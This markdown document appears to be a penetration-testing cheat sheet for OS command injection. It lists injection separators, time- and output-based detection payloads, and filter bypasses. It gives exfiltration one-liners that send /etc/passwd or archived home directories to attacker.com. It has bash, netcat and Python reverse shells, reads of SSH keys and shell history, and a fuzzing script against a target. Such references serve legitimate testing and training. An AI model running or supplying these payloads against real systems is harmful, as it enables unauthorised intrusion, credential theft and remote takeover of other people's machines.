# OS Command Injection — Cheat Sheet

Comprehensive payload reference. Quick reference / detection workflow in `os-command-injection-quickstart.md`.

## Command separators

**Unix/Linux:**

| Separator | Meaning |
|---|---|
| `;` | Sequential execution |
| `&&` | Run B if A succeeds |
| `\|\|` | Run B if A fails |
| `\|` | Pipe stdout |
| `&` | Run in background |
| `` ` ` `` | Backtick command substitution |
| `$()` | Modern command substitution |
| `${IFS}` | Field separator (space replacement) |
| `\n` (`%0a`) | Newline |
| `\r\n` (`%0d%0a`) | CRLF |

**Windows:**

| Separator | Meaning |
|---|---|
| `&` | Sequential |
| `&&` | Run B if A succeeds |
| `\|\|` | Run B if A fails |
| `\|` | Pipe |
| `%CD%` | Current directory |
| `%TEMP%` | Temp directory |

## Detection payloads

**Time-based (universal):**
```
;sleep 5
&& sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
%0Asleep 5
%0D%0Asleep 5
&timeout /t 5     (Windows)
```

**Output-based:**
```
;id
;whoami
;uname -a
;cat /etc/passwd
&dir            (Windows)
&type C:\Windows\win.ini
;hostname
```

**Out-of-band:**
```
;curl http://attacker.com/$(whoami)
;nslookup $(whoami).attacker.com
;wget http://attacker.com/$(id)
$(curl http://attacker.com/$(whoami))
&powershell -c "Invoke-WebRequest http://attacker.com/$env:USERNAME"
```

## Bypass techniques

```bash
# Space filter
{cat,/etc/passwd}                cat$IFS/etc/passwd        cat${IFS}/etc/passwd
cat<>/etc/passwd                  cat$IFS$9/etc/passwd

# JSON-tab → literal tab byte (IFS bypass for `value.includes(' ')` filters)
# When the backend filter is `if user_input.includes(' ') reject;` and the input
# arrives via JSON, the JSON string "foo\tbar" decodes to foo<TAB>bar — passes
# the 0x20 check, but the shell splits on tab (default IFS = space|tab|newline).
# Payload: {"interface": "eth0;cat\t/flag*.txt>\t/some/writable/path"}
# Use `;` instead of `&&` when the leading command may fail (binary missing on
# Alpine/busybox); `;` runs the second regardless. More reliable than ${IFS},
# which doesn't always expand inside the exec'd shell (depends on bash/dash/ash).

# escapeshellcmd bypass via double-shell-eval (PHP)
# Vulnerable: passthru("ping " . escapeshellcmd($_GET['ip']))
# Payload:    1.1.1.1';bash -c 'id

# Slash filter
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
${HOME%${HOME#?}}etc${HOME%${HOME#?}}passwd

# Keyword filter
ca''t /etc/passwd          c\at /etc/passwd        ta'c' /etc/passwd
nl /etc/passwd             head -100 /etc/passwd

# Separator filter (use newlines, &&, ||)
%0Aid    $'\nid'    &&id    ||id    %0a%0did
```

## Data exfiltration

```bash
# File read
;cat /etc/passwd
;ls -la /; find / -name "*.conf" 2>/dev/null; find / -perm -4000 2>/dev/null

# DNS exfil
;nslookup $(whoami).attacker.com
;dig +short $(id | base64 | tr -d '+').attacker.com

# HTTP exfil
;cat /etc/passwd | curl -X POST --data-binary @- http://attacker.com/
;tar czf - /home | curl -X POST --data-binary @- http://attacker.com/
;curl -F "file=@/etc/passwd" http://attacker.com/upload
```

## Reverse shells

```bash
# Bash
;bash -i >& /dev/tcp/attacker/4444 0>&1
;0<&196;exec 196<>/dev/tcp/attacker/4444; sh <&196 >&196 2>&196

# Netcat (-e or named pipe fallback)
;nc -e /bin/bash attacker 4444
;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker 4444 >/tmp/f

# Python
;python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),i) for i in range(3)];pty.spawn("/bin/bash")'

# Perl / PHP / Ruby — see PayloadsAllTheThings/Reverse Shell Cheatsheet for one-liners
# PowerShell — see PayloadsAllTheThings (long one-liner)
```

## Enumeration / vulnerable params

```bash
# System / Network / FS / Users / Processes / Creds
;id; pwd; uname -a; hostname; cat /etc/issue
;ip a; netstat -tulnp; cat /etc/resolv.conf
;ls -la / /home /tmp; find / -writable 2>/dev/null; find / -perm -4000 2>/dev/null
;cat /etc/passwd /etc/group; w; who; last
;ps -ef; top -n 1
;grep -ri 'password' /home 2>/dev/null; cat ~/.ssh/id_rsa; cat ~/.bash_history
;find / -name '*.kdbx' 2>/dev/null
```

Common vulnerable params: `ip`, `host`, `ping`, `cmd`, `domain`, `url`, `file`, `path`, `action`, `download`, `print`, `run`, `execute`, `command`, `package`, `lookup`, `check`, `scan`, `nslookup`.

## Burp Suite workflow

1. Spray separators on every input (`;`, `&&`, `|`, `` ` ``, `$()`).
2. Watch for: response time delay, stderr leak, "ping: ..." in response.
3. Once confirmed, extract via `;id` / `;cat /etc/passwd`.
4. For blind: set up Burp Collaborator, use `;curl http://collab/` payload.

## Library-specific patterns

| Sink | Language | Pattern |
|---|---|---|
| `system()` `exec()` `shell_exec()` `passthru()` | PHP | concat into shell |
| `os.system()` `subprocess.call(shell=True)` | Python | string-concat |
| `subprocess.Popen(..., shell=True)` | Python | shell=True is the bug |
| `child_process.exec()` | Node.js | string-concat |
| `child_process.spawn(..., {shell:true})` | Node.js | shell:true is the bug |
| `Runtime.exec(String)` | Java | string variant |
| `ProcessBuilder` | Java | string-concat in command list |
| `popen()` | C | `system(3)` family |

## Tools

```bash
# Commix
commix --url='http://target/?id=1*' --batch
commix --url='http://target/?id=1' -p 'id' --batch

# Custom Python
import requests, time
for sep in [';','&&','|','`','$()','%0A']:
    p = sep + 'sleep 5'
    start = time.time()
    requests.get('http://target/?id=' + p, timeout=10)
    if time.time() - start > 4.5:
        print(f'[+] Working: {sep}')
```

## Language-specific code-exec sinks

- **RPC parser → `sh -c`** (Thrift/gRPC/RabbitMQ-RPC): service reads an attacker-writable file, regex-extracts a field, plugs it into `os.system(f"echo '... {field} ...' >> log")`. Inject `'; <CMD>; #` (`\047`=`'`) into the field, trigger the RPC method, shell runs as the RPC UID. Use `;` not `&&`. Heuristic: RPC method taking a "file path" arg AND running commands from file content.
- **Python `eval()` format-string**: `eval('%s > 1' % user_input)` / f-string / `.format()` — user data is Python source; `__import__("os").system(...)` runs unconditionally. [scenarios/code-injection/python-eval-format-string.md](scenarios/code-injection/python-eval-format-string.md).
- **Bash symbolic-only sandbox** (allow-list `^[${}![:space:]:_=()]+$`): `$((!$$))=0`, `$((!!$$))=1`, octal `"010"`=8, **`${!__}` on `__=0` returns `$0`**, `${var:1}` indexing, `__=$(ls)` to bootstrap letters. [scenarios/code-injection/bash-symbolic-only-bypass.md](scenarios/code-injection/bash-symbolic-only-bypass.md).
- **PHP `preg_replace` `/e`** (PHP < 7): attacker-controlled pattern→replacement pairs (tell: hidden inputs whose *names are regexes*, e.g. `filters[/word/i]=clean`) — add `filters[/findme/e]=system(base64_decode('...'))` + matching subject. [scenarios/code-injection/php-preg-replace-e-modifier.md](scenarios/code-injection/php-preg-replace-e-modifier.md).

## References

- `os-command-injection-quickstart.md` — fast detection workflow. OWASP Command Injection / CWE-78 / PayloadsAllTheThings.
